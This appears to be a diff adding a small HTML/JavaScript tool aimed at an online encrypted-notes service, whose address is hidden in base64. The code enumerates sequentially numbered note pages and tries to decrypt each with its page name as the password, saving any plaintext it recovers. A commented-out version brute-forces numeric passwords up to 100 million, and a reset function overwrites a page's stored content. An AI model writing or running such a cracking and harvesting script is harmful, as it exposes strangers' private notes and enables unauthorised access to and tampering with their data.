@@ -1,0 +1,145 @@
+<script type="text/javascript" src="aes.js"></script>
+<script>
+
+function download(filename, text) {
+  var element = document.createElement('a');
+  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+  element.setAttribute('download', filename);
+
+  element.style.display = 'none';
+  document.body.appendChild(element);
+
+  element.click();
+
+  document.body.removeChild(element);
+}
+
+function reset() { 
+    var site=location.pathname;
+    var content = `this is my website!!!@`;
+    var passwordToUse='';
+    var expectedDBVersion=2;
+    var newHashContent = state.computeHashContentForDBVersion(content, passwordToUse, expectedDBVersion);
+    var siteHash = CryptoJS.SHA512(site).toString();
+    var eContent = CryptoJS.AES.encrypt(String(content + siteHash), passwordToUse).toString();
+
+    $.ajax({ // AJAX call to save encrypted text on server
+        url : site,
+        type : "POST",
+        data : { // data that's sent to server:
+            "initHashContent" : initHashContent, // hash of initial decrypted content (to prove that you are allowed to write to this site, because you ware able to decrypt it)
+            "currentHashContent" : newHashContent, // new hash
+            "encryptedContent" : eContent, // encrypted content stored on server.
+            "action" : "save" // 'save' action is being performed
+        },
+        dataType : "json",
+        success: function(responseObject, textStatus, jqXHR) {
+            if (responseObject.status == "success") {
+                console.log("done");
+            }
+            else if (responseObject.status != "success" && responseObject.message !== undefined) { // special messages from server
+                console.log("Failed! " + responseObject.message);
+                focusActiveTextarea();
+            }
+            else if (responseObject.status != "success" && responseObject.expectedDBVersion !== undefined) { // special messages from server
+                console.log("Failed! expectedDBVersion = " + responseObject.expectedDBVersion);
+            }
+            else {
+                $("#dialog-site-modified").dialog({ // text was changed in the meantime, show dialog
+                    dialogClass : "no-close active-dialog",
+                    modal : true,
+                    minWidth: 345,
+                    buttons : {
+                        "OK" : function() {
+                            $(this).dialog("close");
+                        }
+                    },
+                    close: function( event, ui ) {
+                        focusActiveTextarea();
+                    }
+                });
+            }
+        },
+        error: function(jqXHR, textStatus, errorThrown) {
+            console.log("Save failed! (check your connection)");
+        },
+        timeout: 30000 // wait 30sec max
+    });
+};
+
+function check(content,pass){
+    try {
+        return CryptoJS.AES.decrypt(content, pass).toString(CryptoJS.enc.Utf8);
+    }
+    catch (err) {
+        return false;
+    }
+}
+
+// function test(key) {
+//   const xhttp = new XMLHttpRequest();
+//   xhttp.onload = function() {
+//     var c0=this.responseText;
+//     var start = c0.indexOf("new ClientState(") + "new ClientState(".length;
+//     var end = c0.indexOf(")", start);
+//     var c = c0.substring(start, end);
+//     var c1 = c.split(',')[1];
+//     var content = c1.replace(/\"/g, "").trim();
+//     document.querySelector("code").append(content+"\n");
+
+//     for (var i = 0; i < 100000000; i++)
+//     {
+//         if (i % 1000 == 0) console.log(i);
+//         var pass = ""+i;
+//         var result=check(content,pass);
+//         if(result){
+//         	console.log(result);
+//         	return;
+//         }
+//     }
+//   }
+//   xhttp.open("GET", atob("aHR0cHM6Ly93d3cucHJvdGVjdGVkdGV4dC5jb20v")+key, true);
+//   xhttp.send();
+// }
+// document.querySelector("code")
+
+var i=0;
+var completed=-1;
+function test(key,index) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.onload = function() {
+    var c0=this.responseText;
+    var start = c0.indexOf("new ClientState(") + "new ClientState(".length;
+    var end = c0.indexOf(")", start);
+    var c = c0.substring(start, end);
+    var c1 = c.split(',')[1];
+    var content = c1.replace(/\"/g, "").trim();
+    var pass = ""+key;
+    var result=check(content,pass);
+    if(result){
+    	document.querySelector("code").prepend(key+"\n");
+        download(key+".txt", content+"\r\n\r\n\r\n"+result);
+    }
+    completed=index;
+    // if(index % 100==0)
+        console.log(key);
+  }
+  xhttp.open("GET", atob("aHR0cHM6Ly93d3cucHJvdGVjdGVkdGV4dC5jb20v")+key, true);
+  xhttp.send();
+}
+
+function start(){
+    completed=i-1;
+	setInterval(function(){
+		if(completed>=i-1){
+			var id=""+i;
+			if(id.length==1)id="00"+id;
+			else if(id.length==2)id="0"+id;
+			test(id,i);
+			i++;
+		}
+	},10);
+}
+</script>
+
+<pre><code></code></pre>
